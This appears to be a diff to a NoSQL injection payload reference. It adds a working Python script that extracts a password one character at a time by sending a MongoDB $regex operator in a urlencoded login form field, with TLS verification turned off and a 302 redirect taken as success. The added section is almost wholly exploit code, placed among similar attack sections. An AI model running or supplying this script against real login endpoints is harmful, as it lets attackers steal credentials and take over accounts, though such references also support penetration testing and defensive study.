@@ -98,6 +98,30 @@ while True:
                 password += c
 ```
 
+### POST with urlencoded body
+
+```python
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username="admin"
+password=""
+u="http://example.org/login"
+headers={'content-type': 'application/x-www-form-urlencoded'}
+
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|','&','$']:
+            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
+            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
+                print("Found one more char : %s" % (password+c))
+                password += c
+```
+
 ### GET
 
 ```python
